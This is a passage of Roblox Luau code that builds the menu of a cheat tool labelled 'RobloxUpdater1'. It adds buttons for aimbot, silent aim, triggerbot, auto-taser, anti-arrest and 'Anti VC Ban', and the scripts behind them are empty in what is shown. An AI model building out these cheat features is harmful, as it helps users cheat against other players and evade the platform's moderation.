UI["1c4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1c4"]["Size"] = UDim2.new(0, 181, 0, 56)
UI["1c4"]["BackgroundTransparency"] = 0.85
UI["1c4"]["Name"] = [[AntiVCBan]]
UI["1c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1c4"]["Text"] = [[Anti VC Ban: OFF]]
UI["1c4"]["Position"] = UDim2.new(0.03604, 0, 0.58866, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.UICorner \\ --
UI["1c5"] = Instance.new("UICorner", UI["1c4"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.TextLabel 1 \\ --
UI["1c6"] = Instance.new("TextLabel", UI["1c4"])
UI["1c6"]["TextWrapped"] = true
UI["1c6"]["BorderSizePixel"] = 0
UI["1c6"]["TextTransparency"] = 0.32
UI["1c6"]["TextScaled"] = true
UI["1c6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1c6"]["TextSize"] = 74
UI["1c6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1c6"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1c6"]["BackgroundTransparency"] = 1
UI["1c6"]["Size"] = UDim2.new(0, 211, 0, 16)
UI["1c6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1c6"]["Text"] = [[You can no longer get VC ban]]
UI["1c6"]["Name"] = [[TextLabel 1]]
UI["1c6"]["Position"] = UDim2.new(-0.0884, 0, 1.11401, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.LocalScript \\ --
UI["1c7"] = Instance.new("LocalScript", UI["1c4"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.UIGradient \\ --
UI["1c8"] = Instance.new("UIGradient", UI["1c4"])
UI["1c8"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.animation \\ --
UI["1c9"] = Instance.new("LocalScript", UI["1c4"])
UI["1c9"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.UIStroke \\ --
UI["1ca"] = Instance.new("UIStroke", UI["1c4"])
UI["1ca"]["Transparency"] = 0.63
UI["1ca"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1ca"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiVCBan.Click Sound \\ --
UI["1cb"] = Instance.new("LocalScript", UI["1c4"])
UI["1cb"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest \\ --
UI["1cc"] = Instance.new("TextButton", UI["1ba"])
UI["1cc"]["BorderSizePixel"] = 0
UI["1cc"]["TextSize"] = 24
UI["1cc"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1cc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1cc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1cc"]["Size"] = UDim2.new(0, 181, 0, 56)
UI["1cc"]["BackgroundTransparency"] = 0.85
UI["1cc"]["Name"] = [[AntiArrest]]
UI["1cc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1cc"]["Text"] = [[Anti Arrest: OFF]]
UI["1cc"]["Position"] = UDim2.new(0.03604, 0, 0.24515, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.UICorner \\ --
UI["1cd"] = Instance.new("UICorner", UI["1cc"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.TextLabel 1 \\ --
UI["1ce"] = Instance.new("TextLabel", UI["1cc"])
UI["1ce"]["TextWrapped"] = true
UI["1ce"]["BorderSizePixel"] = 0
UI["1ce"]["TextTransparency"] = 0.32
UI["1ce"]["TextScaled"] = true
UI["1ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1ce"]["TextSize"] = 74
UI["1ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1ce"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1ce"]["BackgroundTransparency"] = 1
UI["1ce"]["Size"] = UDim2.new(0, 211, 0, 16)
UI["1ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1ce"]["Text"] = [[you can't be Arresred]]
UI["1ce"]["Name"] = [[TextLabel 1]]
UI["1ce"]["Position"] = UDim2.new(-0.0884, 0, 1.11401, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.LocalScript \\ --
UI["1cf"] = Instance.new("LocalScript", UI["1cc"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.UIGradient \\ --
UI["1d0"] = Instance.new("UIGradient", UI["1cc"])
UI["1d0"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.animation \\ --
UI["1d1"] = Instance.new("LocalScript", UI["1cc"])
UI["1d1"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.UIStroke \\ --
UI["1d2"] = Instance.new("UIStroke", UI["1cc"])
UI["1d2"]["Transparency"] = 0.63
UI["1d2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1d2"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.AntiArrest.Click Sound \\ --
UI["1d3"] = Instance.new("LocalScript", UI["1cc"])
UI["1d3"]["Name"] = [[Click Sound]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.MAIN.ScrollingFrame2.UIListLayout \\ --
UI["1d4"] = Instance.new("UIListLayout", UI["1ba"])
UI["1d4"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["1d4"]["Padding"] = UDim.new(0, 40)
UI["1d4"]["SortOrder"] = Enum.SortOrder.LayoutOrder

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot \\ --
UI["1d5"] = Instance.new("Frame", UI["e"])
UI["1d5"]["Visible"] = false
UI["1d5"]["BorderSizePixel"] = 0
UI["1d5"]["BackgroundColor3"] = Color3.fromRGB(27, 27, 27)
UI["1d5"]["Size"] = UDim2.new(0, 444, 0, 262)
UI["1d5"]["Position"] = UDim2.new(0.2262, 0, 0.15519, 0)
UI["1d5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1d5"]["Name"] = [[Aimbot]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.UICorner \\ --
UI["1d6"] = Instance.new("UICorner", UI["1d5"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Underline \\ --
UI["1d7"] = Instance.new("Frame", UI["1d5"])
UI["1d7"]["BorderSizePixel"] = 0
UI["1d7"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["1d7"]["Size"] = UDim2.new(0, 3, 0, -193)
UI["1d7"]["Position"] = UDim2.new(0.47297, 0, 0.96021, 0)
UI["1d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1d7"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Aimbot \\ --
UI["1d8"] = Instance.new("TextButton", UI["1d5"])
UI["1d8"]["BorderSizePixel"] = 0
UI["1d8"]["TextSize"] = 41
UI["1d8"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1d8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1d8"]["Size"] = UDim2.new(0, 193, 0, 47)
UI["1d8"]["BackgroundTransparency"] = 0.85
UI["1d8"]["Name"] = [[Aimbot]]
UI["1d8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1d8"]["Text"] = [[Aimbot]]
UI["1d8"]["Position"] = UDim2.new(0.51696, 0, 0.30416, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Aimbot.TextLabel 1 \\ --
UI["1d9"] = Instance.new("TextLabel", UI["1d8"])
UI["1d9"]["TextWrapped"] = true
UI["1d9"]["BorderSizePixel"] = 0
UI["1d9"]["TextTransparency"] = 0.32
UI["1d9"]["TextScaled"] = true
UI["1d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1d9"]["TextSize"] = 74
UI["1d9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1d9"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1d9"]["BackgroundTransparency"] = 1
UI["1d9"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["1d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1d9"]["Text"] = [[L to close/open]]
UI["1d9"]["Name"] = [[TextLabel 1]]
UI["1d9"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Aimbot.UIStroke \\ --
UI["1da"] = Instance.new("UIStroke", UI["1d8"])
UI["1da"]["Transparency"] = 0.63
UI["1da"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1da"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Aimbot.UICorner \\ --
UI["1db"] = Instance.new("UICorner", UI["1d8"])
UI["1db"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Aimbot.UIGradient \\ --
UI["1dc"] = Instance.new("UIGradient", UI["1d8"])
UI["1dc"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Aimbot.AimbotScript \\ --
UI["1dd"] = Instance.new("LocalScript", UI["1d8"])
UI["1dd"]["Name"] = [[AimbotScript]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Aimbot.animation \\ --
UI["1de"] = Instance.new("LocalScript", UI["1d8"])
UI["1de"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.TEXT \\ --
UI["1df"] = Instance.new("TextLabel", UI["1d5"])
UI["1df"]["BorderSizePixel"] = 0
UI["1df"]["TextTransparency"] = 0.44
UI["1df"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1df"]["TextSize"] = 28
UI["1df"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
UI["1df"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1df"]["BackgroundTransparency"] = 1
UI["1df"]["Size"] = UDim2.new(0, 423, 0, 28)
UI["1df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1df"]["Text"] = [[Tools Tab]]
UI["1df"]["Name"] = [[TEXT]]
UI["1df"]["Position"] = UDim2.new(0, 0, 0.03524, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.TEXT.UICorner \\ --
UI["1e0"] = Instance.new("UICorner", UI["1df"])


-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.TEXT.Underline \\ --
UI["1e1"] = Instance.new("Frame", UI["1df"])
UI["1e1"]["BorderSizePixel"] = 0
UI["1e1"]["BackgroundColor3"] = Color3.fromRGB(60, 60, 60)
UI["1e1"]["Size"] = UDim2.new(0, 199, 0, -2)
UI["1e1"]["Position"] = UDim2.new(0.26478, 0, 1.21429, 0)
UI["1e1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1e1"]["Name"] = [[Underline]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.UIGradient \\ --
UI["1e2"] = Instance.new("UIGradient", UI["1d5"])
UI["1e2"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(78, 78, 78))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Toggle PartAim \\ --
UI["1e3"] = Instance.new("TextButton", UI["1d5"])
UI["1e3"]["BorderSizePixel"] = 0
UI["1e3"]["TextSize"] = 41
UI["1e3"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1e3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1e3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1e3"]["Size"] = UDim2.new(0, 193, 0, 41)
UI["1e3"]["BackgroundTransparency"] = 0.85
UI["1e3"]["Name"] = [[Toggle PartAim]]
UI["1e3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1e3"]["Text"] = [[Head]]
UI["1e3"]["Position"] = UDim2.new(0.51696, 0, 0.66704, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Toggle PartAim.UIStroke \\ --
UI["1e4"] = Instance.new("UIStroke", UI["1e3"])
UI["1e4"]["Transparency"] = 0.63
UI["1e4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1e4"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Toggle PartAim.UICorner \\ --
UI["1e5"] = Instance.new("UICorner", UI["1e3"])
UI["1e5"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Toggle PartAim.UIGradient \\ --
UI["1e6"] = Instance.new("UIGradient", UI["1e3"])
UI["1e6"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Toggle PartAim.animation \\ --
UI["1e7"] = Instance.new("LocalScript", UI["1e3"])
UI["1e7"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.Toggle PartAim.TextLabel 1 \\ --
UI["1e8"] = Instance.new("TextLabel", UI["1e3"])
UI["1e8"]["TextWrapped"] = true
UI["1e8"]["BorderSizePixel"] = 0
UI["1e8"]["TextTransparency"] = 0.32
UI["1e8"]["TextScaled"] = true
UI["1e8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1e8"]["TextSize"] = 74
UI["1e8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1e8"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1e8"]["BackgroundTransparency"] = 1
UI["1e8"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["1e8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1e8"]["Text"] = [[Targeted body part:]]
UI["1e8"]["Name"] = [[TextLabel 1]]
UI["1e8"]["Position"] = UDim2.new(-0.00518, 0, -0.56332, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1 \\ --
UI["1e9"] = Instance.new("ScrollingFrame", UI["1d5"])
UI["1e9"]["Active"] = true
UI["1e9"]["SizeConstraint"] = Enum.SizeConstraint.RelativeXX
UI["1e9"]["BorderSizePixel"] = 0
UI["1e9"]["CanvasSize"] = UDim2.new(0, 0, 1, 0)
UI["1e9"]["AutoLocalize"] = false
UI["1e9"]["MidImage"] = [[rbxassetid://88305916544750]]
UI["1e9"]["VerticalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["1e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1e9"]["Name"] = [[ScrollingFrame1]]
UI["1e9"]["HorizontalScrollBarInset"] = Enum.ScrollBarInset.ScrollBar
UI["1e9"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY
UI["1e9"]["Size"] = UDim2.new(0, 210, 0, 193)
UI["1e9"]["ScrollBarImageColor3"] = Color3.fromRGB(65, 215, 255)
UI["1e9"]["Position"] = UDim2.new(-0.00125, 0, 0.22357, 0)
UI["1e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1e9"]["ScrollBarThickness"] = 5
UI["1e9"]["BackgroundTransparency"] = 1

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.UIListLayout \\ --
UI["1ea"] = Instance.new("UIListLayout", UI["1e9"])
UI["1ea"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center
UI["1ea"]["Padding"] = UDim.new(0, 40)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.UIPadding \\ --
UI["1eb"] = Instance.new("UIPadding", UI["1e9"])
UI["1eb"]["PaddingTop"] = UDim.new(0, 7)
UI["1eb"]["PaddingBottom"] = UDim.new(0, 20)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.2Toggle PartSilent \\ --
UI["1ec"] = Instance.new("TextButton", UI["1e9"])
UI["1ec"]["BorderSizePixel"] = 0
UI["1ec"]["TextSize"] = 41
UI["1ec"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1ec"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1ec"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1ec"]["Size"] = UDim2.new(0, 183, 0, 41)
UI["1ec"]["BackgroundTransparency"] = 0.85
UI["1ec"]["Name"] = [[2Toggle PartSilent]]
UI["1ec"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1ec"]["Text"] = [[Head]]
UI["1ec"]["Position"] = UDim2.new(0.06429, 0, 1.28313, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.2Toggle PartSilent.TextLabel 1 \\ --
UI["1ed"] = Instance.new("TextLabel", UI["1ec"])
UI["1ed"]["TextWrapped"] = true
UI["1ed"]["BorderSizePixel"] = 0
UI["1ed"]["TextTransparency"] = 0.32
UI["1ed"]["TextScaled"] = true
UI["1ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1ed"]["TextSize"] = 74
UI["1ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1ed"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1ed"]["BackgroundTransparency"] = 1
UI["1ed"]["Size"] = UDim2.new(0, 183, 0, 17)
UI["1ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1ed"]["Text"] = [[Targeted body part:]]
UI["1ed"]["Name"] = [[TextLabel 1]]
UI["1ed"]["Position"] = UDim2.new(0, 0, 1.19278, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.2Toggle PartSilent.UIStroke \\ --
UI["1ee"] = Instance.new("UIStroke", UI["1ec"])
UI["1ee"]["Transparency"] = 0.63
UI["1ee"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1ee"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.2Toggle PartSilent.UICorner \\ --
UI["1ef"] = Instance.new("UICorner", UI["1ec"])
UI["1ef"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.2Toggle PartSilent.UIGradient \\ --
UI["1f0"] = Instance.new("UIGradient", UI["1ec"])
UI["1f0"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.2Toggle PartSilent.animation \\ --
UI["1f1"] = Instance.new("LocalScript", UI["1ec"])
UI["1f1"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.1SilentAim \\ --
UI["1f2"] = Instance.new("TextButton", UI["1e9"])
UI["1f2"]["BorderSizePixel"] = 0
UI["1f2"]["TextSize"] = 41
UI["1f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1f2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1f2"]["Size"] = UDim2.new(0, 183, 0, 47)
UI["1f2"]["BackgroundTransparency"] = 0.85
UI["1f2"]["Name"] = [[1SilentAim]]
UI["1f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1f2"]["Text"] = [[Silent Aim]]
UI["1f2"]["Position"] = UDim2.new(0.06429, 0, -0.39759, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.1SilentAim.TextLabel 1 \\ --
UI["1f3"] = Instance.new("TextLabel", UI["1f2"])
UI["1f3"]["TextWrapped"] = true
UI["1f3"]["BorderSizePixel"] = 0
UI["1f3"]["TextTransparency"] = 0.32
UI["1f3"]["TextScaled"] = true
UI["1f3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1f3"]["TextSize"] = 74
UI["1f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1f3"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1f3"]["BackgroundTransparency"] = 1
UI["1f3"]["Size"] = UDim2.new(0, 193, 0, 17)
UI["1f3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1f3"]["Text"] = [[K to close/open]]
UI["1f3"]["Name"] = [[TextLabel 1]]
UI["1f3"]["Position"] = UDim2.new(0, 0, 1.07083, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.1SilentAim.UIStroke \\ --
UI["1f4"] = Instance.new("UIStroke", UI["1f2"])
UI["1f4"]["Transparency"] = 0.63
UI["1f4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1f4"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.1SilentAim.UICorner \\ --
UI["1f5"] = Instance.new("UICorner", UI["1f2"])
UI["1f5"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.1SilentAim.UIGradient \\ --
UI["1f6"] = Instance.new("UIGradient", UI["1f2"])
UI["1f6"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.1SilentAim.SilentAimScript \\ --
UI["1f7"] = Instance.new("LocalScript", UI["1f2"])
UI["1f7"]["Name"] = [[SilentAimScript]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.1SilentAim.animation \\ --
UI["1f8"] = Instance.new("LocalScript", UI["1f2"])
UI["1f8"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.3AutoTaser \\ --
UI["1f9"] = Instance.new("TextButton", UI["1e9"])
UI["1f9"]["TextWrapped"] = true
UI["1f9"]["BorderSizePixel"] = 0
UI["1f9"]["TextSize"] = 41
UI["1f9"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1f9"]["TextScaled"] = true
UI["1f9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["1f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1f9"]["Size"] = UDim2.new(0, 183, 0, 47)
UI["1f9"]["BackgroundTransparency"] = 0.85
UI["1f9"]["Name"] = [[3AutoTaser]]
UI["1f9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1f9"]["Text"] = [[AutoTaser: OFF]]
UI["1f9"]["Position"] = UDim2.new(0.06429, 0, -0.39759, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.3AutoTaser.TextLabel 1 \\ --
UI["1fa"] = Instance.new("TextLabel", UI["1f9"])
UI["1fa"]["TextWrapped"] = true
UI["1fa"]["BorderSizePixel"] = 0
UI["1fa"]["TextTransparency"] = 0.32
UI["1fa"]["TextScaled"] = true
UI["1fa"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["1fa"]["TextSize"] = 74
UI["1fa"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["1fa"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["1fa"]["BackgroundTransparency"] = 1
UI["1fa"]["Size"] = UDim2.new(0, 183, 0, 17)
UI["1fa"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["1fa"]["Text"] = [[Automatically tasers wanteds]]
UI["1fa"]["Name"] = [[TextLabel 1]]
UI["1fa"]["Position"] = UDim2.new(0, 0, 1.24104, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.3AutoTaser.UIStroke \\ --
UI["1fb"] = Instance.new("UIStroke", UI["1f9"])
UI["1fb"]["Transparency"] = 0.63
UI["1fb"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border
UI["1fb"]["Thickness"] = 1.7

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.3AutoTaser.UICorner \\ --
UI["1fc"] = Instance.new("UICorner", UI["1f9"])
UI["1fc"]["CornerRadius"] = UDim.new(0, 10)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.3AutoTaser.UIGradient \\ --
UI["1fd"] = Instance.new("UIGradient", UI["1f9"])
UI["1fd"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(43, 189, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))}

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.3AutoTaser.TeaserAimScript \\ --
UI["1fe"] = Instance.new("LocalScript", UI["1f9"])
UI["1fe"]["Name"] = [[TeaserAimScript]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.3AutoTaser.animation \\ --
UI["1ff"] = Instance.new("LocalScript", UI["1f9"])
UI["1ff"]["Name"] = [[animation]]

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.TriggerBot \\ --
UI["200"] = Instance.new("TextButton", UI["1e9"])
UI["200"]["TextWrapped"] = true
UI["200"]["BorderSizePixel"] = 0
UI["200"]["TextSize"] = 41
UI["200"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
UI["200"]["TextScaled"] = true
UI["200"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
UI["200"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
UI["200"]["Size"] = UDim2.new(0, 193, 0, 47)
UI["200"]["BackgroundTransparency"] = 0.85
UI["200"]["Name"] = [[TriggerBot]]
UI["200"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
UI["200"]["Text"] = [[Triggerbot: OFF]]
UI["200"]["Position"] = UDim2.new(0.51696, 0, 0.30416, 0)

-- // StarterGui.RobloxUpdater1.MainTab.Frames.Aimbot.ScrollingFrame1.TriggerBot.TextLabel 1 \\ --
UI["201"] = Instance.new("TextLabel", UI["200"])
UI["201"]["TextWrapped"] = true
UI["201"]["BorderSizePixel"] = 0
UI["201"]["TextTransparency"] = 0.32
UI["201"]["TextScaled"] = true
UI["201"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
UI["201"]["TextSize"] = 74
